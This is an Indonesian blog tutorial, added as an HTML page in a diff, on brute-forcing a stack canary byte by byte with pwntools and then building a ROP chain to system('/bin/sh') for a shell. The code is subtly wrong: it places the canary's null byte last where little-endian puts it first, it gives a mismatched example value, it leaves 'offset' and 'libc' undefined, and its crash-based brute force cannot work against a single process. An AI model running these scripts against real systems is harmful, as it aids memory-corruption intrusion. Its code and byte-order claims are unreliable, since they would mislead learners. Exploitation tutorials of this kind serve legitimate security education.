@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  
+  <style>
+    body {
+      background-color: #2e2e2e;
+      color: #c7c5c5;;
+      
+      font-family: 'Mono', sans-serif;  
+    }
+
+
+    a {
+      color: #48a874;  
+      text-decoration: none;
+    }
+
+    a:hover {
+      color: darkgray;  
+    }
+
+    a:visited {
+      color: #48a874;  
+    }
+
+    .fa {
+      font-family: "Font Awesome 6 Free", sans-serif;  
+      font-weight: 30px;
+    }
+  </style>
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">
+
+  
+  
+    <meta name="description" content="1. Apa Itu Bit dan Byte?
+Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+
+1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
+1 Byte = Kumpulan 8 bit (contoh: 01011010).
+
+1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
+Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+
+
+
+Contoh:
+
+00000000 (binary) = 0 (decimal)
+11111111 (binary) = 255 (decimal)
+
+Kesimpulan:">
+  
+
+  <title>
+    
+      Bypass Stack Canary Memahami Bit, Byte, dan Nilai 256 dalam bruteforce Exploit - Pwn03
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />
+
+  
+  
+
+  
+    <meta name="description" content="1. Apa Itu Bit dan Byte?
+Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+
+1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
+1 Byte = Kumpulan 8 bit (contoh: 01011010).
+
+1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
+Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+
+
+
+Contoh:
+
+00000000 (binary) = 0 (decimal)
+11111111 (binary) = 255 (decimal)
+
+Kesimpulan:">
+    <meta property="og:description" content="1. Apa Itu Bit dan Byte?
+Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+
+1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
+1 Byte = Kumpulan 8 bit (contoh: 01011010).
+
+1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
+Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+
+
+
+Contoh:
+
+00000000 (binary) = 0 (decimal)
+11111111 (binary) = 255 (decimal)
+
+Kesimpulan:">
+    <meta property="og:image" content="/path/to/default-image.jpg">
+    <meta name="twitter:image" content="/path/to/default-image.jpg">
+
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="/posts/stack-canary-bf/">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Bypass Stack Canary Memahami Bit, Byte, dan Nilai 256 dalam bruteforce Exploit - Pwn03">
+  <meta name="twitter:description" content="1. Apa Itu Bit dan Byte?
+Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+
+1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
+1 Byte = Kumpulan 8 bit (contoh: 01011010).
+
+1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
+Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+
+
+
+Contoh:
+
+00000000 (binary) = 0 (decimal)
+11111111 (binary) = 255 (decimal)
+
+Kesimpulan:">
+</head>
+
+
+
+
+
+
+
+
+
+
+
+<body a="black">
+
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~ $ cd /home</a>
+
+
+<article>
+    <p class="post-meta">
+    </p>
+
+<h1>Bypass Stack Canary Memahami Bit, Byte, dan Nilai 256 dalam bruteforce Exploit - Pwn03<br><br>
+    <small datetime="2025-08-19 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
+        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
+        2025-08-19 - Rainhynn
+    </small>
+</h1>
+
+    
+
+    <h2 id="1-apa-itu-bit-dan-byte"><strong>1. Apa Itu Bit dan Byte?</strong></h2>
+<p>Sebelum memahami <strong>stack canary</strong>, kita perlu mengerti dasar-dasar <strong>bit</strong> dan <strong>byte</strong>:</p>
+<ul>
+<li><strong>1 Bit</strong> = Nilai terkecil dalam komputasi (<code>0</code> atau <code>1</code>).</li>
+<li><strong>1 Byte</strong> = Kumpulan <strong>8 bit</strong> (contoh: <code>01011010</code>).
+<ul>
+<li><strong>1 Byte bisa menyimpan nilai dari <code>0</code> sampai <code>255</code></strong> (total <strong>256 kemungkinan</strong>).</li>
+<li>Kenapa <strong>256</strong>? Karena <code>2^8 = 256</code> (8 bit = 256 kombinasi).</li>
+</ul>
+</li>
+</ul>
+<p>Contoh:</p>
+<ul>
+<li><code>00000000</code> (binary) = <code>0</code> (decimal)</li>
+<li><code>11111111</code> (binary) = <code>255</code> (decimal)</li>
+</ul>
+<p><strong>Kesimpulan:</strong></p>
+<ul>
+<li><strong>1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).</strong></li>
+<li><strong>Nilai 256 dipakai karena itu batas maksimal 1 byte.</strong></li>
+</ul>
+<hr>
+<h2 id="2-apa-itu-stack-canary"><strong>2. Apa Itu Stack Canary?</strong></h2>
+<p><strong>Stack Canary</strong> adalah nilai rahasia (random) di stack yang berfungsi seperti &ldquo;alarm&rdquo; untuk mendeteksi <strong>buffer overflow</strong>.</p>
+<ul>
+<li>
+<p><strong>Ukuran Canary:</strong></p>
+<ul>
+<li><strong>32-bit program</strong> → Canary = <strong>4 byte</strong> (contoh: <code>0xefbead00</code>)</li>
+<li><strong>64-bit program</strong> → Canary = <strong>8 byte</strong> (contoh: <code>0xdeadbeefcafeb00</code>)</li>
+</ul>
+</li>
+<li>
+<p><strong>Cara Kerja:</strong></p>
+<ul>
+<li>Jika ada <strong>buffer overflow</strong>, canary akan <strong>tertimpa</strong> sebelum return address.</li>
+<li>Sebelum fungsi selesai (<code>ret</code>), program mengecek apakah canary masih utuh.</li>
+<li>Jika <strong>berubah</strong> → Program crash (<code>*** stack smashing detected ***</code>).</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="3-kenapa-brute-force-canary-menggunakan"><strong>3. Kenapa Brute-Force Canary Menggunakan <code>range(256)</code>?</strong></h2>
+<p>Karena <strong>setiap byte canary bisa bernilai <code>0</code> sampai <code>255</code> (total 256 kemungkinan)</strong>, kita perlu mencoba semua kemungkinan byte tersebut.</p>
+<h3 id="contoh-brute-force-canary-32-bit"><strong>Contoh Brute-Force Canary (32-bit)</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)  <span style="color:#0f0"># Program 32-bit (canary 4 byte)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;&#34;</span>  <span style="color:#0f0"># Inisialisasi canary kosong</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Brute-force 3 byte pertama (byte ke-4 = \x00)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">3</span>):  <span style="color:#0f0"># 3 byte pertama</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> byte in range(<span style="color:#f60">256</span>):  <span style="color:#0f0"># Coba semua nilai byte (0-255)</span>
+</span></span><span style="display:flex;"><span>        payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span>*offset + canary + bytes([byte])
+</span></span><span style="display:flex;"><span>        p.sendline(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;stack smashing&#34;</span> not in p.recv():  <span style="color:#0f0"># Jika tidak crash, byte benar</span>
+</span></span><span style="display:flex;"><span>            canary += bytes([byte])  <span style="color:#0f0"># Tambahkan byte yang benar</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Found byte </span><span style="color:#87ceeb">{</span>i+<span style="color:#f60">1</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>hex(byte)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Tambahkan null byte terakhir (byte ke-4)</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Full canary: </span><span style="color:#87ceeb">{</span>hex(u32(canary))<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)  <span style="color:#0f0"># Output: 0xefbead00 (misal)</span>
+</span></span></code></pre></div><h3 id="penjelasan-kode"><strong>Penjelasan Kode:</strong></h3>
+<ol>
+<li><strong><code>for byte in range(256)</code></strong>
+<ul>
+<li>Mencoba <strong>semua nilai byte (0-255)</strong> untuk menemukan byte yang benar.</li>
+</ul>
+</li>
+<li><strong><code>bytes([byte])</code></strong>
+<ul>
+<li>Mengubah angka (misal <code>255</code>) menjadi byte (<code>\xff</code>).</li>
+</ul>
+</li>
+<li><strong><code>canary += b&quot;\x00&quot;</code></strong>
+<ul>
+<li>Byte terakhir canary biasanya <code>\x00</code> (null byte), jadi tidak perlu ditebak.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="4-penerapan-brute-force-canary-dalam-exploit"><strong>4. Penerapan Brute-Force Canary dalam Exploit</strong></h2>
+<p>Setelah dapat <strong>canary</strong>, kita bisa lanjutkan eksploitasi dengan <strong>Return-Oriented Programming (ROP)</strong> atau <strong>Ret2Libc</strong>.</p>
+<h3 id="contoh-payload-setelah-dapat-canary-32-bit"><strong>Contoh Payload Setelah Dapat Canary (32-bit)</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
+</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>  <span style="color:#0f0"># Ganti dengan offset yang benar</span>
+</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\xef\xbe\xad\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Canary yang sudah ditemukan</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># ROP chain untuk call system(&#34;/bin/sh&#34;)</span>
+</span></span><span style="display:flex;"><span>rop = ROP(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
+</span></span><span style="display:flex;"><span>rop.call(<span style="color:#87ceeb">&#34;system&#34;</span>, [next(libc.search(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;/bin/sh&#34;</span>))])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload = (
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * offset +  <span style="color:#0f0"># Isi buffer</span>
+</span></span><span style="display:flex;"><span>    canary +         <span style="color:#0f0"># Canary yang benar</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">12</span> +      <span style="color:#0f0"># Padding (EBP &amp; alignment)</span>
+</span></span><span style="display:flex;"><span>    rop.chain()      <span style="color:#0f0"># ROP chain</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.interactive()  <span style="color:#0f0"># Dapat shell!</span>
+</span></span></code></pre></div><hr>
+<h2 id="5-kesimpulan"><strong>5. Kesimpulan</strong></h2>
+<ul>
+<li><strong>1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).</strong></li>
+<li><strong>Brute-force canary</strong> = Mencoba semua kemungkinan byte (<code>0-255</code>) untuk menemukan nilai canary.</li>
+<li><strong>32-bit canary</strong> = 4 byte (3 byte ditebak, 1 byte null).</li>
+<li><strong>64-bit canary</strong> = 8 byte (7 byte ditebak, 1 byte null).</li>
+<li><strong>Setelah dapat canary</strong>, lanjutkan dengan <strong>ROP/Ret2Libc</strong> untuk bypass NX.</li>
+</ul>
+<p>Dengan memahami <strong>bit, byte, dan nilai 256</strong>, kita bisa melakukan <strong>brute-force canary</strong> untuk mengeksploitasi <strong>buffer overflow</strong>! 🚀</p>
+
+</article>
+
+<hr>
+
+<p>© 2021-2025 HnvDie</p>
+<p>Powered By Hugo ᯓᡣ𐭩</p>
+
+
+
+            </div>
+        </main>
+    </body></html>
